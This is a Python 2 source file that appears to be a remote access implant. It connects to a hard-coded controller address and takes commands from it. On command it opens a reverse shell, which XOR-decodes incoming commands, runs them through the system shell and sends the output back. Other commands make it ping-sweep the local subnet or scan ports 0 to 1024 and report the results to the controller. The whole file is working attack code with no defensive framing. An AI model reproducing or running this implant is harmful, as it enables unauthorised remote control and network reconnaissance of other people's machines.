
import socket, subprocess, sys
import threading
import thread
import os
import platform
import time
#RHOST = sys.argv[1]
RHOST = '192.168.1.104'

def get_port(IP): 
    RPORT = 7777    
    s_p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_p.connect((IP, RPORT))      
    def socket_port(ip,PORT): 
        if PORT>=1024:
            s_p.send("over") 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
        result=s.connect_ex((ip,PORT))
        if(result==0):
            tmpt = ip+':'+'  '+str(PORT)+'  '+'open'
            s_p.send(tmpt) 
        s.close()
    #IP=RHOST
        #t=time.time()
    for i in range(0, 1024 + 1):
        thread.start_new_thread(socket_port,(IP,int(i)))
        time.sleep(0.003) 
    s_p.send("over")
    s_p.close()
        #print 'used time:%f' % (time.time()-t)     
    
def my_reshell():
   
    RPORT = 8888    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))    
    while True:
        data = s.recv(1024)
        # The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
        comm = subprocess.Popen(str(my_jiami(data)), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        STDOUT, STDERR = comm.communicate()   
        # Encode the output and send to RHOST
        #en_STDOUT= bytearray(STDOUT)
        #en_STDERR = bytearray(STDOUT)
        #for i in range(len(en_STDOUT)):
            #en_STDOUT[i] ^= 0x41
        s.send(STDOUT)
        s.send(STDERR)
    s.close()

def LAN_IP():
    #RHOST = '192.168.1.100'
    RPORT = 9999    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))    
    #while True:
    def ping_ip(ip_str,s): 
        cmd = ["ping", "-n", "1", ip_str] 
        output = os.popen(" ".join(cmd)).readlines() 
    
        flag = False
        for line in list(output): 
            if not line: 
                continue
            if str(line).upper().find("TTL") >=0: 
                flag = True
                break
        if flag: 
            a = ip_str+'   '+platform.system()
            #print "ip: %s is ok   %s"%(ip_str,platform.system())
            s.send(a)

    def find_ip(ip_prefix,s): 
        th_pool = []
        for i in range(1,256): 
            ip = '%s.%s'%(ip_prefix,i) 
            th = threading.Thread(target=ping_ip,args=(ip,s,))
            th_pool.append(th)
            
        for th in th_pool:
            th.start()
        for th in th_pool:
            threading.Thread.join(th)
    
    
        #start_time = datetime.datetime.now()
    #commandargs = sys.argv[1:] 
    args = "".join(RHOST)   
    ip_prefix = '.'.join(args.split('.')[:-1]) 
    find_ip(ip_prefix,s) 
    s.send('close')
    s.close()   
    
    
def my_jiami(data):
    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] ^= 0x41  
    return en_data


#m_RHOST = '192.168.1.100'
m_RPORT = 8061    
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ss.connect((RHOST, m_RPORT))   
data = ss.recv(1024)
print data

if data == 'IP':
    LAN_IP()
elif data == 'shell':
    my_reshell()
else:
    get_port(data)
ss.close()